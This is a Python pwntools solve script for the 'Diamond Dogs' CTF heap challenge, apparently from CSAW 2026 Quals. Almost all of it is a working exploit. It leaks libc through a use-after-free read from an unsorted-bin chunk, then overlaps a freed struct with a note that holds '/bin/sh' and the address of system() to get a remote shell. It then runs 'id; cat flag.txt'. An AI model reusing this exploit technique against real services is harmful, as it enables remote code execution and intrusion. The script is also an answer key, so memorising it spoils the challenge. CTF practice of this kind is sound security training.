#!/usr/bin/env python3
"""Diamond Dogs (CSAW CTF 2026 Quals) — UAF leak + dog/note overlap.

Usage:
    python3 solve.py                  # local, bundled glibc 2.31
    python3 solve.py HOST:PORT        # remote
    python3 solve.py HOST PORT
"""
from __future__ import annotations

import os
import re
import sys

from pwn import ELF, context, log, p64, process, remote, u64

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))


def find_dir() -> str:
    candidates = [
        os.path.join(HERE, "extracted", "files"),
        os.path.join(HERE, "artifacts", "files"),
        os.path.join(HERE, "..", "agent_workspace", "extracted", "files"),
        os.path.join(HERE, "agent_workspace", "extracted", "files"),
    ]
    for path in candidates:
        path = os.path.normpath(path)
        if os.path.isfile(os.path.join(path, "guard-dog")) and os.path.isfile(
            os.path.join(path, "libc-2.31.so")
        ):
            return path
    raise SystemExit("guard-dog / libc-2.31.so not found next to solve.py")


FILES = find_dir()
BIN = os.path.join(FILES, "guard-dog")
LIBC_PATH = os.path.join(FILES, "libc-2.31.so")
elf = ELF(BIN, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)


def adopt(io, i: int) -> None:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"kennel (0-7): ", str(i).encode())
    io.sendafter(b"name: ", b"A" * 0x18)


def command(io, i: int) -> None:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"kennel: ", str(i).encode())


def release(io, i: int) -> None:
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"kennel: ", str(i).encode())


def note(io, slot: int, size: int, data: bytes) -> None:
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"note slot (0-7): ", str(slot).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"contents: ", data)


def read_note(io, slot: int, n: int) -> bytes:
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"note slot: ", str(slot).encode())
    io.recvuntil(b"contents: ")
    return io.recvn(n, timeout=5)


def shred(io, slot: int) -> None:
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"note slot: ", str(slot).encode())


def connect():
    args = sys.argv[1:]
    if not args or args[0] in {"local", "LOCAL"}:
        log.info("local process %s", BIN)
        return process(BIN)
    target = args[0]
    if ":" in target:
        host, port = target.rsplit(":", 1)
        return remote(host, int(port))
    if len(args) >= 2:
        return remote(args[0], int(args[1]))
    raise SystemExit("usage: solve.py [local | HOST:PORT | HOST PORT]")


def extract_flag(text: str) -> str | None:
    for pat in (r"csaw\{[^}]+\}", r"csawctf\{[^}]+\}", r"flag\{[^}]+\}"):
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(0)
    return None


def main() -> None:
    io = connect()

    # Phase 1: unsorted-bin libc leak via note UAF read.
    # 0x420 is above tcache max; a 0x20 guard stops top consolidation.
    note(io, 0, 0x420, b"L" * 0x420)
    note(io, 1, 0x20, b"G" * 0x20)
    shred(io, 0)
    leak = read_note(io, 0, 0x20)
    fd = u64(leak[:8])
    log.info("unsorted fd = %s", hex(fd))
    if fd == 0:
        log.failure("no leak")
        io.close()
        sys.exit(1)

    # fd = &main_arena.unsorted = libc + __malloc_hook + 0x70 on this 2.31.
    base = fd - libc.symbols["__malloc_hook"] - 0x70
    if base & 0xFFF:
        log.failure("libc base not page-aligned: %s", hex(base))
        io.close()
        sys.exit(1)
    libc.address = base
    try:
        binsh = next(libc.search(b"/bin/sh\x00"))
    except StopIteration:
        log.failure("base does not resolve /bin/sh")
        io.close()
        sys.exit(1)
    system = libc.symbols["system"]
    log.success("libc %s  system %s  /bin/sh %s", hex(base), hex(system), hex(binsh))

    # Phase 2: 0x20 dog and 0x20 note share the 0x30 tcache bin.
    # release_dog frees without NULLing kennel[i]; command_dog still
    # calls qword ptr [dog+0x18] with rdi = dog.
    adopt(io, 0)
    release(io, 0)
    payload = b"/bin/sh\x00" + b"\x00" * 16 + p64(system)
    assert len(payload) == 0x20
    note(io, 2, 0x20, payload)
    command(io, 0)

    io.sendline(b"echo SHELL_OK; id; cat flag.txt")
    out = io.recvrepeat(3)
    text = out.decode("utf-8", "replace")
    print(text)
    flag = extract_flag(text)
    if flag:
        log.success("FLAG %s", flag)
        with open(os.path.join(HERE, "flag.txt"), "w") as fh:
            fh.write(flag + "\n")
    elif b"SHELL_OK" in out:
        log.success("shell confirmed (no flag.txt on this run)")
    else:
        log.failure("no shell")
        io.close()
        sys.exit(2)
    io.close()


if __name__ == "__main__":
    main()
